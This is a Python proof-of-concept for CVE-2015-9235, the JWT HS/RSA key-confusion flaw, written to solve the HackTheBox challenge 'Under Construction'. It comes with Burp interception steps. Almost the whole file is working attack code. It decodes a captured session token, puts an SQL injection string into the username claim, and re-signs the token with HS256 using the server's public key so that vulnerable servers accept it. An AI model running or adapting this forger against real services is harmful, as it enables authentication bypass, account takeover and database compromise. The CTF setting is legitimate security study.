"""
CVE-2015-9235 PoC, known as
"JWT HS/RSA key confusion vulnerability".
This PoC was used to solve the HTB challenge
"Under Construction" on HackTheBox (HTB).
USAGE:
==
Token was obtained by logging into the
 "Under Construction" web app provided by the
HTB challenge:
1. Register a user via the register function
2. Start Burp proxy and configure browser to
    connect to proxy
3. Login via the login function with "Intercept is on"
4. Forward request and send response to repeater
5. Copy token from the "Cookie: session=" header to file,
          e.g. jwt_token_example.txt
6. Invoke jwt_forge.py with subshell:
      python3 jwt_token.py $(cat jwt_token_example.txt) username
"""
import sys
import argparse
import base64  # Encode/decode strings in Base64Url
import json
import jwt
from colorama import Fore

# Quick intro to JWT tokens:
# ==
#
# JWT Token;
# Three parts, seperated by ".":
#   1. Header
#   2. Payload
#   3. Signature
#
# Each part is Base64Url encoded.
#
# Header consists of:
# * Type of token (JWT)
# * Signing Algorithm; HMAC SHA256 (HS256) or RSA.
#
# Payload consists of token "claims".
# There are three types of claims:
#   1. Registered
#   2. Public
#   3. Private
#
# Claims, although protected against tampering,
# are readable by anyone.
#
# The signature is the verifying message.
# For example, HMAC SHA256, as specified
# in the header if chosen as the signing
# method, consists of:
# * The Base64Url encoded header and payload,
# seperated by ".", plus a secret, known only
# by the signer
# e.g.
# HMACSHA256(
#  base64UrlEncode(header) + "." +
#  base64UrlEncode(payload),
#  secret
#  )
#
# The final token is made up of these three
# Base64Url strings - separated by dots.

parser = argparse.ArgumentParser(description="JWT Key Confusion Forger for HTB Under Construction")
parser.add_argument("token", type=str, help="JWT token to confuse (must include 'pk' payload)")
parser.add_argument("sqli_cmd", type=str, help="SQL injected username to replace token username")
args = parser.parse_args()
TOKEN=args.token
SQLI_CMD = args.sqli_cmd

HEADER_ENCODED = None
PAYLOAD_ENCODED = None
SIGNATURE_ENCODED = None

TOKEN_SPLIT = []
for t in TOKEN.split("."):
    TOKEN_SPLIT.append(t)

HEADER_ENCODED = TOKEN_SPLIT[0]
TOKEN_SPLIT[1] += '=' * (-len(TOKEN[1]) % 4) # restore stripped ='s
PAYLOAD_ENCODED = TOKEN_SPLIT[1]
SIGNATURE_ENCODED = TOKEN_SPLIT[2]

#print("HEADER ENCODED: {}\n".format(HEADER_ENCODED))
#print("PAYLOAD ENCODED: {}\n".format(PAYLOAD_ENCODED))
#print("SIGNATURE ENCODED: {}\n".format(SIGNATURE_ENCODED))

print()
print(Fore.BLUE + "Decoding JWT Token..." + Fore.RESET)
print()
HEADER_DECODED = base64.urlsafe_b64decode(HEADER_ENCODED).decode('UTF-8')
PAYLOAD_DECODED = base64.urlsafe_b64decode(PAYLOAD_ENCODED).decode('UTF-8')

PAYLOAD = json.loads(PAYLOAD_DECODED)

# Replace username in payload with SQLi command.
try:
    USERNAME = PAYLOAD.get('username')
    print(Fore.GREEN + "Found username:" + Fore.RESET)
    print(USERNAME)
except KeyError:
    print(Fore.RED + "ERROR: No username found in payload. Abort." + Fore.RESET)
    sys.exit(-1)

print()
print(Fore.GREEN + "Replacing username {} with".format(USERNAME) + Fore.RESET)
print(SQLI_CMD)
print()
PAYLOAD['username'] = SQLI_CMD

# Attack!
# Re-create token, update alg to HS256 and sign with public key.
#
# As per: CVE-2015-9235 and this blog,
# https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/,
# the server side will "verify" the token validity by:
#   1. Expecting "RSA", but receiving "HS256"
#   2. Blindly passing the public key as the "verificationKey",
#      confusing the public key as the verification key for the HS256
#
# Since the attacker signs the token with the public key as the 'secret' to
# the HS256 secret key alg, the server side verification will result in a
# verified token.
#
# Apparently this was a vulnerability in multiple JWT token implementations
# including "jsonwebtoken" as described here:
# https://snyk.io/vuln/npm:jsonwebtoken:20150331
# "Under Construction"'s package.json includes "jsonwebtoken", although at
# version ^8.5.1 which is not vulnerable?
# FUTURE: I guess the server side version is old and therefore vulnerable?

# 1. Get the supplied server public key 'pk' from PAYLOAD
try:
    PK = PAYLOAD.get('pk')
    print(Fore.GREEN + "Found public key:" + Fore.RESET)
    print(PK)
    print()
except KeyError:
    print(Fore.RED + "ERROR: No public key 'pk' found in payload. Abort." + Fore.RESET)
    sys.exit(-1)

print(Fore.GREEN + "Final payload:" + Fore.RESET)
print(json.dumps(PAYLOAD))
print()

# 2. Create a new token using pk as the 'secret' for HS256 alg;
# FUTURE: using pyjwt's jwt.encode - re-implement later?
print(Fore.BLUE + "Forging confused token ..." + Fore.RESET)
FORGED_TOKEN_ENC = jwt.encode(PAYLOAD, PK, algorithm="HS256")

# 3. Print encoded token for use against web app
print()
print(Fore.GREEN + "Forged token:" + Fore.RESET)
print(FORGED_TOKEN_ENC.decode('UTF-8'))
print()
print(Fore.YELLOW + "Copy the above forged token and substitute token in request." + Fore.RESET)

